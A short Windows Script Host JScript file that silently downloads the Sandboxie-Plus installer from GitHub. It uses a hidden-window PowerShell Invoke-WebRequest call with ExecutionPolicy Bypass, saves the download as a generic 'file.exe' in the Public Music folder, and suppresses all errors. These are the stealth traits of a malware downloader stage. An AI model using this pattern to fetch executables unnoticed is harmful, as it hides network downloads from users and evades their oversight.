try {
    var url = "https://github.com/sandboxie-plus/Sandboxie/releases/download/v1.16.3/Sandboxie-Plus-x64-v1.16.3.exe";

    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    var musicPath = shell.ExpandEnvironmentStrings("C:\\Users\\Public\\Music");
    var filePath = fso.BuildPath(musicPath, "file.exe");

    var psCommand = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \'' + url + '\' -OutFile \'' + filePath + '\'"';

    shell.Run(psCommand, 0, true);

    WScript.Echo("Download complete: " + filePath);
} catch (e) {
    // Suppress all errors silently
}
